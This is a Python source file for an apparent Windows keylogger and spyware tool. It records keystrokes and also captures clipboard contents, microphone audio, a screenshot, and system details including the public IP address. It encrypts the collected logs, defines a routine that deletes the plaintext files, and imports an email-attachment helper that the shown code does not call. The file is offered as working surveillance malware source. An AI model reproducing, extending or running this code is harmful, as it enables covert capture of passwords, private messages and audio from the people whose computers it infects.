#Imports
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from pathlib import Path
from numpy import number

from pynput.keyboard import Key, Listener

from cryptography.fernet import Fernet

from scipy.io.wavfile import write
import sounddevice as sd

from requests import get
import getpass

import win32clipboard

import platform
import socket
import time
import os

from dotenv import load_dotenv
load_dotenv()

from mailer import send_mail_with_attachment

#File names to store data
keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screenshot_info = "screenshot.png"

#Encrypted file names
system_info_e = 'e_system_info.txt'
clipboard_info_e = 'e_clipboard.txt'
keys_info_e = 'e_keys_log.txt'

#File path plus extension to add name
file_path = "C:\\Users\\nikhi\\Desktop\\Advanced-Keylogger"
extend_path = "\\"
file_merge = file_path+extend_path

#SYSTEM INFORMATION
def system_information():
    with open(file_path + extend_path + system_info, "a") as f:
        #Get system Information
        hostname = socket.gethostname()
        ip_addr = socket.gethostbyname(hostname)
        try:
            external_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + external_ip + "\n")
        except Exception:
            f.write("Couldn't get public IP address!\n")
        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + ip_addr + "\n\n")

system_information()

#CLIPBOARD INFORMATION
def clipboard_information():
    with open(file_path + extend_path + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard(0)
            clipboard_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + clipboard_data)
        except:
            print("Clipboard could not be copied")

clipboard_information()

#MICROPHONE INFORMATION
def sound_information():
    fs = 44100 #Sampling frequency
    duration = 5 #Duration of recording in seconds
    #Record audio
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()
    #Write audio to file
    write(file_path+extend_path+audio_info, fs, recording)

sound_information()

#SCREENSHOT INFORMATION
def screenshot():
    screenshot = ImageGrab.grab(bbox=None, include_layered_windows=False,
                                all_screens=False, xdisplay=None)
    screenshot.save(file_path+extend_path+screenshot_info)

screenshot()

#KEY MONITORING & LOGGING
#Variables to keep track of keys pressed and the number of keys pressed
count = 0
keys = []

#Function when a key is pressed
def on_press(key):
    global keys, count
    #Keep track of key presses and the number of keys pressed
    keys.append(key)
    count = count+1
    #Display which key was pressed
    print("{0} pressed".format(key))
    #Write to file after every 15 key presses and reset variables
    if count >= 15:
        count = 0
        write_file(keys)
        keys = []

#Function when a key is released
def on_release(key):
    #Condition to exit keylogger
    if key==Key.esc:
        return False

#Function to write the key presses to a file
def write_file(keys):
    with open(file_path + extend_path + keys_info, "a") as f:
        for key in keys:
            #Format key to be readable
            formatted_key = str(key).replace("'", "")
            #Add new line everytime a space key is pressed
            if formatted_key.find("space") > 0:
                f.write("\n")
            #If not a special key then write to file otherwise ignore
            elif formatted_key.find("Key") == -1:
                f.write(formatted_key)
        f.close()

#Listen for keypresses and implements functions collectively
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

#FILE ENCRYPTION
files_to_encrypt = [file_merge+keys_info, file_merge+clipboard_info, file_merge+system_info]
encrypted_file_names = [file_merge+keys_info_e, file_merge+clipboard_info_e, file_merge+system_info_e]

cnt = 0
key = os.environ.get("ENCRYPTION_KEY")

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[cnt], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[cnt], 'wb') as f:
        f.write(encrypted)

    cnt += 1

#FILE DELETING
def delete_files():
    files = [system_info, clipboard_info, keys_info, audio_info, screenshot_info]
    for file in files:
        os.remove(file_merge+file)